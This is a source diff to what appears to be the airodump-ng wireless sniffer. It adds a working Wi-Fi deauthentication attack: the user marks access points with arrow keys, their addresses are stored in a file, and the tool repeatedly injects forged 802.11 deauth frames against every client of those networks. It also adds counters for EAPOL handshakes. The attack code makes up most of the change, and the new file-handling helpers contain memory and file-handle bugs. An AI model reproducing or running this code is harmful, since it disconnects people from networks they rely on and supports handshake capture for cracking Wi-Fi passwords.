@@ -80,6 +80,218 @@ GCRY_THREAD_OPTION_PTHREAD_IMPL;
 void dump_sort(void);
 void dump_print(int ws_row, int ws_col, int if_num);
 
+int CHECK_REALLY_DEAUTH(struct AP_info *ap_cur)
+{
+	if (ap_cur->m_bUnderAttack)
+	{
+		if ((ap_cur->security & STD_WPA) || (ap_cur->security & STD_WPA2))
+		{
+			return 1;
+		}
+		else
+		{
+			if (ap_cur->deauth_if_OPENorWEP)
+				return 1;
+		}
+	}
+	return 0;
+}
+
+unsigned long nb_pkt_sent;
+struct wif *wi[MAX_CARDS];
+int send_packet(void *buf, size_t count)
+{
+	unsigned char *pkt = (unsigned char*) buf;
+
+	if ((count > 24) && (pkt[1] & 0x04) == 0 && (pkt[22] & 0x0F) == 0)
+	{
+		pkt[22] = (nb_pkt_sent & 0x0000000F) << 4;
+		pkt[23] = (nb_pkt_sent & 0x00000FF0) >> 4;
+	}
+
+	if (wi_write(wi[0], buf, count, NULL) == -1)
+	{
+		switch (errno)
+		{
+		case EAGAIN:
+		case ENOBUFS:
+			usleep(10000);
+			return 0; /* XXX not sure I like this... -sorbo */
+		}
+
+		perror("wi_write()");
+		return -1;
+	}
+
+	nb_pkt_sent++;
+	return 0;
+}
+
+int deauth_STA_FROM_AP(void* r_bssid, void* r_dmac)
+{
+	unsigned char h80211[4096];
+
+#define DEAUTH_REQ      \
+    "\xC0\x00\x3A\x01\xCC\xCC\xCC\xCC\xCC\xCC\xBB\xBB\xBB\xBB\xBB\xBB" \
+    "\xBB\xBB\xBB\xBB\xBB\xBB\x00\x00\x07\x00"
+
+	memcpy(h80211, DEAUTH_REQ, 26);
+	memcpy(h80211 + 16, r_bssid, 6);
+
+	memcpy(h80211 + 4, r_dmac, 6);
+	memcpy(h80211 + 10, r_bssid, 6);
+
+	if (send_packet(h80211, 26) < 0)
+		return (1);
+
+	usleep(2000);
+
+	memcpy(h80211 + 4, r_bssid, 6);
+	memcpy(h80211 + 10, r_dmac, 6);
+
+	if (send_packet(h80211, 26) < 0)
+		return (1);
+	return (0);
+}
+
+void RemoveAPfromDeauthFile(unsigned char* pMAC)
+{
+	FILE* myFile = NULL;
+	char* pBuf = NULL;
+	if ((myFile = fopen("ap_list_deauth.txt", "r")) != NULL)
+	{
+		const int _todo = 118;
+		char strBufMacToRemove[_todo];
+		sprintf(strBufMacToRemove, "%02X:%02X:%02X:%02X:%02X:%02X\n", pMAC[0],
+				pMAC[1], pMAC[2], pMAC[3], pMAC[4], pMAC[5]);
+
+		fseek(myFile, 0, SEEK_END);
+		long int iFileSize = ftell(myFile);
+		rewind(myFile);
+		char* pBuf = malloc(iFileSize);
+		if (pBuf)
+		{
+			pBuf[0] = 0;
+			char strBufMacRead[_todo];
+			while (fgets(strBufMacRead, sizeof(strBufMacRead), myFile))
+			{
+				if (0 != strcasecmp(strBufMacToRemove, strBufMacRead))
+				{ //we have not the MAC to remove, add to file
+					strcat(pBuf, strBufMacRead);
+				}
+			}
+			fclose(myFile);
+			if ((myFile = fopen("ap_list_deauth.txt", "w")) != NULL)
+				fwrite(pBuf, 1, strlen(pBuf), myFile);
+		}
+
+	}
+	if (pBuf)
+		free(pBuf);
+	if (myFile)
+		fclose(myFile);
+}
+
+int CheckAPinDeauthFile(unsigned char* pAPbinaryMAC)
+{
+	int iRet = 0;
+	FILE* myFile;
+	if ((myFile = fopen("ap_list_deauth.txt", "a+")) != NULL)
+	{
+		char strBufNewMac[MAC_STR_LEN + 1];
+		snprintf(strBufNewMac, sizeof(strBufNewMac),
+				"%02X:%02X:%02X:%02X:%02X:%02X\n", pAPbinaryMAC[0],
+				pAPbinaryMAC[1], pAPbinaryMAC[2], pAPbinaryMAC[3],
+				pAPbinaryMAC[4], pAPbinaryMAC[5]);
+
+		char strBufSearchMac[MAC_STR_LEN + 1];
+		while (fgets(strBufSearchMac, sizeof(strBufSearchMac), myFile))
+		{
+			//found
+			if (0
+					== strncasecmp(strBufSearchMac, strBufNewMac,
+							sizeof(strBufSearchMac) - 1))
+			{
+				iRet = 1;
+				break;
+			}
+		}
+		fclose(myFile);
+	}
+	return iRet;
+}
+
+void AddAPtoDeauthFile(unsigned char* pMAC)
+{
+	FILE* myFile;
+	if ((myFile = fopen("ap_list_deauth.txt", "a+")) != NULL)
+	{
+		char strBufNewMac[32];
+		sprintf(strBufNewMac, "%02X:%02X:%02X:%02X:%02X:%02X\n", pMAC[0],
+				pMAC[1], pMAC[2], pMAC[3], pMAC[4], pMAC[5]);
+
+		//if MAC is already in file, than skip it
+		char strBufSearchMac[MAC_STR_LEN + 1];
+		int bFound = 0;
+		while (fgets(strBufSearchMac, sizeof(strBufSearchMac), myFile))
+		{
+			//found
+			if (0
+					== strncasecmp(strBufSearchMac, strBufNewMac,
+							sizeof(strBufSearchMac) - 1))
+			{
+				bFound = 1;
+				break;
+			}
+		}
+		if (0 == bFound)
+			fprintf(myFile, "%s", strBufNewMac);
+		fclose(myFile);
+	}
+}
+
+void printMbKbGbsize(char* bufToWrite, long unsigned int size)
+{
+	size_t div = 0;
+	size_t rem = 0;
+
+	while (size >= 1024)
+	{
+		rem = (size % 1024);
+		div++;
+		size /= 1024;
+	}
+
+	bufToWrite[0] = 0;
+	switch (div)
+	{
+	case 0: //B
+		if (size <= 9)
+			sprintf(bufToWrite, "%lu.00By", size);
+		else if ((size > 9) && (size < 100))
+			sprintf(bufToWrite, "%lu.0By", size);
+		else
+			sprintf(bufToWrite, "%lu By", size);
+		break;
+	case 1: //Kb
+		if (size <= 9)
+			sprintf(bufToWrite, "%.2fKb", (float) size + (float) rem / 1024.0);
+		else if ((size > 9) && (size < 100))
+			sprintf(bufToWrite, "%.1fKb", (float) size + (float) rem / 1024.0);
+		else if (size < 1000)
+			sprintf(bufToWrite, "%lu Kb", size);
+		else
+			sprintf(bufToWrite, "%luKb", size);
+		break;
+	case 2: //Mb
+		sprintf(bufToWrite, "%.2fMb", (float) size + (float) rem / 1024.0);
+		break;
+	case 3: //Gb
+		sprintf(bufToWrite, "%.3fGb", (float) size + (float) rem / 1024.0);
+		break;
+	}
+}
+
 char * get_manufacturer_from_string(char * buffer)
 {
 	char * manuf = NULL;
@@ -203,6 +415,8 @@ void resetSelection()
 	G.selection_ap = 0;
 	G.selection_sta = 0;
 	G.mark_cur_ap = 0;
+	G.mark_cur_ap_to_deauth = 0;
+	G.unmark_cur_ap_to_deauth = 0;
 	G.skip_columns = 0;
 	G.do_pause = 0;
 	G.do_sort_always = 0;
@@ -333,6 +547,16 @@ void input_thread(void *arg)
 		if (keycode == KEY_m)
 		{
 			G.mark_cur_ap = 1;
+		}
+
+		if (keycode == KEY_ARROW_RIGHT)
+		{
+			G.mark_cur_ap_to_deauth = 1;
+		}
+
+		if (keycode == KEY_ARROW_LEFT)
+		{
+			G.unmark_cur_ap_to_deauth = 1;
 		}
 
 		if (keycode == KEY_ARROW_DOWN)
@@ -1442,6 +1666,7 @@ int dump_add_packet(unsigned char *h80211, int caplen, struct rx_info *ri,
 		ap_cur->is_decloak = 0;
 		ap_cur->packets = NULL;
 
+		ap_cur->m_bUnderAttack = CheckAPinDeauthFile(ap_cur->bssid);
 		ap_cur->marked = 0;
 		ap_cur->marked_color = 1;
 
@@ -1721,7 +1946,12 @@ int dump_add_packet(unsigned char *h80211, int caplen, struct rx_info *ri,
 
 	if (h80211[0] == 0x80 || h80211[0] == 0x50)
 	{
-		if (!(ap_cur->security & (STD_OPN | STD_WEP | STD_WPA | STD_WPA2)))
+		if (h80211[0] == 0x80)
+			g_ulRead_pkts_beacons++;
+
+		//reset encryption on each beacon
+		ap_cur->security = 0;
+		//if( !(ap_cur->security & (STD_OPN|STD_WEP|STD_WPA|STD_WPA2)) )
 		{
 			if ((h80211[34] & 0x10) >> 4)
 				ap_cur->security |= STD_WEP | ENC_WEP;
@@ -2037,7 +2267,10 @@ int dump_add_packet(unsigned char *h80211, int caplen, struct rx_info *ri,
 			p += 2 + p[1];
 		}
 		if (st_cur != NULL)
+		{
 			st_cur->wpa.state = 0;
+			st_cur->m_uiAssocLpkts++;
+		}
 	}
 
 	/* packet parsing: some data */
@@ -2300,6 +2533,8 @@ int dump_add_packet(unsigned char *h80211, int caplen, struct rx_info *ri,
 
 			if (st_cur == NULL)
 				goto write_packet;
+
+			st_cur->m_uiEAPOLpkts++;
 
 			/* frame 1: Pairwise == 1, Install == 0, Ack == 1, MIC == 0 */
 
@@ -3091,7 +3326,15 @@ void dump_print(int ws_row, int ws_col, int if_num)
 	struct ST_info *st_cur;
 	struct NA_info *na_cur;
 	int columns_ap = 83;
-	int columns_sta = 74;
+	char* str_columns_sta;
+	if (G.show_manufacturer)
+		str_columns_sta =
+				" BSSID              STATION            Assc/EAPOL  PWR  dtp tlde    Rate    Lost    Frames  !Manuf!  Probes";
+	else
+		str_columns_sta =
+				" BSSID              STATION            Assc/EAPOL  PWR  dtp tlde    Rate    Lost    Frames  Probes";
+
+	int columns_sta = strlen(str_columns_sta);
 	int columns_na = 68;
 
 	int num_ap;
@@ -3163,7 +3406,33 @@ void dump_print(int ws_row, int ws_col, int if_num)
 	}
 	else
 	{
-		snprintf(strbuf, sizeof(strbuf) - 1, " CH %2d", G.channel[0]);
+		//vasa
+		struct timeval cur_time;
+		gettimeofday(&cur_time, NULL);
+		unsigned int time_diff = 1000000
+				* (cur_time.tv_sec - timeBytesPerSec.tv_sec)
+				+ (cur_time.tv_usec - timeBytesPerSec.tv_usec);
+		timeBytesPerSec = cur_time;
+		g_uiTempTimeAggregator += time_diff;
+		if (g_uiTempTimeAggregator > 500000) //update bytes/sec not often as 500ms
+		{
+			g_uiBytesDeltaPerSec = 1000000
+					* ((float) (ulRead_Bytes - ulRead_Bytes_tmp))
+					/ g_uiTempTimeAggregator;
+			g_uiTempTimeAggregator = 0;
+			ulRead_Bytes_tmp = ulRead_Bytes;
+			g_flag500ms_hopper_for_print = 1;
+		}
+
+		char bufFormatMbs_ulRead_Bytes[16];
+		printMbKbGbsize(bufFormatMbs_ulRead_Bytes, ulRead_Bytes);
+		char bufFormatMbs_uiBytesDeltaPerSec[16];
+		printMbKbGbsize(bufFormatMbs_uiBytesDeltaPerSec, g_uiBytesDeltaPerSec);
+
+		snprintf(strbuf, sizeof(strbuf) - 1,
+				"%s %s/s Beacons:%lu Pkts:%lu CH%2d", bufFormatMbs_ulRead_Bytes,
+				bufFormatMbs_uiBytesDeltaPerSec, g_ulRead_pkts_beacons,
+				ulRead_pkts, G.channel[0]);
 		for (i = 1; i < if_num; i++)
 		{
 			memset(buffer, '\0', sizeof(buffer));
@@ -3412,6 +3681,23 @@ void dump_print(int ws_row, int ws_col, int if_num)
 
 			if (G.selection_ap && ((num_ap) == G.selected_ap))
 			{
+				if (G.mark_cur_ap_to_deauth)
+				{
+					AddAPtoDeauthFile(ap_cur->bssid);
+					G.mark_cur_ap_to_deauth = 0;
+					ap_cur->m_bUnderAttack = 1;
+					ap_cur->deauth_if_OPENorWEP = 0;
+				}
+				else
+				{
+					if (G.unmark_cur_ap_to_deauth)
+					{
+						RemoveAPfromDeauthFile(ap_cur->bssid);
+						G.unmark_cur_ap_to_deauth = 0;
+						ap_cur->m_bUnderAttack = 0;
+						ap_cur->deauth_if_OPENorWEP = 0;
+					}
+				}
 				if (G.mark_cur_ap)
 				{
 					if (ap_cur->marked == 0)
@@ -3433,9 +3719,24 @@ void dump_print(int ws_row, int ws_col, int if_num)
 				memcpy(G.selected_bssid, ap_cur->bssid, 6);
 			}
 
-			if (ap_cur->marked)
+			if (CHECK_REALLY_DEAUTH(ap_cur))
 			{
+				if (g_flag500ms_hopper_for_print) //update text color not often as 500ms)
+				{
+					ap_cur->marked_color++;
+					if (ap_cur->marked_color > (TEXT_MAX_COLOR - 1))
+					{
+						ap_cur->marked_color = 1;
+					}
+				}
 				textcolor_fg(ap_cur->marked_color);
+			}
+			else
+			{
+				if (ap_cur->marked)
+				{
+					textcolor_fg(ap_cur->marked_color);
+				}
 			}
 
 			fprintf(stderr, "%s", strbuf);
@@ -3484,7 +3785,7 @@ void dump_print(int ws_row, int ws_col, int if_num)
 			fprintf( stderr, "\n");
 
 			if ((G.selection_ap && ((num_ap) == G.selected_ap))
-					|| (ap_cur->marked))
+					|| (ap_cur->marked) || CHECK_REALLY_DEAUTH(ap_cur))
 			{
 				textstyle(TEXT_RESET);
 			}
@@ -3506,8 +3807,7 @@ void dump_print(int ws_row, int ws_col, int if_num)
 
 	if (G.show_sta)
 	{
-		memcpy(strbuf, " BSSID              STATION "
-				"           PWR   Rate    Lost    Frames  Probes", columns_sta);
+		memcpy(strbuf, str_columns_sta, columns_sta);
 		strbuf[ws_col - 1] = '\0';
 		fprintf( stderr, "%s\n", strbuf);
 
@@ -3519,6 +3819,7 @@ void dump_print(int ws_row, int ws_col, int if_num)
 
 		num_sta = 0;
 
+		//walk through all APs
 		while (ap_cur != NULL)
 		{
 			if (ap_cur->nb_pkt < 2 || time( NULL) - ap_cur->tlast > G.berlin)
@@ -3558,6 +3859,10 @@ void dump_print(int ws_row, int ws_col, int if_num)
 				textcolor_fg(ap_cur->marked_color);
 			}
 
+			if (CHECK_REALLY_DEAUTH(ap_cur))
+				textcolor_fg(ap_cur->marked_color);
+
+			//walk through all stations
 			while (st_cur != NULL)
 			{
 				if (st_cur->base != ap_cur
@@ -3574,6 +3879,42 @@ void dump_print(int ws_row, int ws_col, int if_num)
 				}
 
 				num_sta++;
+
+				if (CHECK_REALLY_DEAUTH(ap_cur))
+				{
+					struct timeval time_beg;
+					gettimeofday(&time_beg, NULL);
+					if (g_iLastSetChannel != ap_cur->channel)
+					{
+						if (wi_set_channel(wi[0], ap_cur->channel) == 0)
+						{
+							g_iLastSetChannel = ap_cur->channel;
+						}
+						else
+						{
+							g_iLastSetChannel = -1;
+							perror("wi_set_channel failed");
+							exit(-1);
+						}
+					}
+					if (g_iLastSetChannel != -1)
+					{
+						deauth_STA_FROM_AP(ap_cur->bssid, st_cur->stmac);
+						usleep(1000);
+					}
+					struct timeval time_end;
+					gettimeofday(&time_end, NULL);
+					st_cur->m_lastDeauthProcessingTime_us = 1000000
+							* (time_end.tv_sec - time_beg.tv_sec)
+							+ (time_end.tv_usec - time_beg.tv_usec);
+
+					st_cur->m_ulLastDeauthTimeDelta_us = 1000000
+							* (time_end.tv_sec
+									- st_cur->m_timeval_lastDeauth.tv_sec)
+							+ (time_end.tv_usec
+									- st_cur->m_timeval_lastDeauth.tv_usec);
+					st_cur->m_timeval_lastDeauth = time_end;
+				}
 
 				if (G.start_print_sta > num_sta)
 					continue;
@@ -3595,13 +3936,24 @@ void dump_print(int ws_row, int ws_col, int if_num)
 						st_cur->stmac[0], st_cur->stmac[1], st_cur->stmac[2],
 						st_cur->stmac[3], st_cur->stmac[4], st_cur->stmac[5]);
 
+				fprintf( stderr, "  %4d/%5d", st_cur->m_uiAssocLpkts,
+						st_cur->m_uiEAPOLpkts);
 				fprintf( stderr, "  %3d ", st_cur->power);
+				fprintf( stderr, "%4lu ",
+						st_cur->m_lastDeauthProcessingTime_us / 1000);
+				fprintf( stderr, "%4lu ",
+						st_cur->m_ulLastDeauthTimeDelta_us / 1000);
+
 				fprintf( stderr, "  %2d", st_cur->rate_to / 1000000);
 				fprintf( stderr, "%c", (st_cur->qos_fr_ds) ? 'e' : ' ');
 				fprintf( stderr, "-%2d", st_cur->rate_from / 1000000);
 				fprintf( stderr, "%c", (st_cur->qos_to_ds) ? 'e' : ' ');
 				fprintf( stderr, "  %4d", st_cur->missed);
 				fprintf( stderr, " %8ld", st_cur->nb_pkt);
+
+				//print client manufacturer
+				if (G.show_manufacturer)
+					fprintf( stderr, "  !%s!", st_cur->manuf);
 
 				if (ws_col > (columns_sta - 6))
 				{
@@ -3623,7 +3975,11 @@ void dump_print(int ws_row, int ws_col, int if_num)
 
 					memset(strbuf, 0, sizeof(strbuf));
 					snprintf(strbuf, sizeof(strbuf) - 1, "%-256s", ssid_list);
-					strbuf[ws_col - (columns_sta - 6)] = '\0';
+					strbuf[ws_col - (columns_sta - 6)
+							- ((G.show_manufacturer) ?
+									(strlen(st_cur->manuf) - strlen("!Manuf!")
+											+ 2) :
+									(0))] = '\0';
 					fprintf( stderr, " %s", strbuf);
 				}
 
@@ -3634,7 +3990,7 @@ void dump_print(int ws_row, int ws_col, int if_num)
 
 			if ((G.selection_ap
 					&& (memcmp(G.selected_bssid, ap_cur->bssid, 6) == 0))
-					|| (ap_cur->marked))
+					|| (ap_cur->marked) || (CHECK_REALLY_DEAUTH(ap_cur)))
 			{
 				textstyle(TEXT_RESET);
 			}
@@ -3702,6 +4058,7 @@ void dump_print(int ws_row, int ws_col, int if_num)
 			na_cur = na_cur->next;
 		}
 	}
+	g_flag500ms_hopper_for_print = 0;
 }
 
 int dump_write_csv(void)
@@ -5811,7 +6168,6 @@ int main(int argc, char *argv[])
 
 	time_t tt1, tt2, tt3, start_time;
 
-	struct wif *wi[MAX_CARDS];
 	struct rx_info ri;
 	unsigned char tmpbuf[4096];
 	unsigned char buffer[4096];
@@ -7046,8 +7402,12 @@ int main(int argc, char *argv[])
 						break;
 //                         return 1;
 					}
+					if (ri.ri_power == 0) //this is our own injected packet, skip it
+						continue;
 
 					read_pkts++;
+					ulRead_pkts++;
+					ulRead_Bytes += caplen;
 
 					wi_read_failed = 0;
 					dump_add_packet(h80211, caplen, &ri, i);
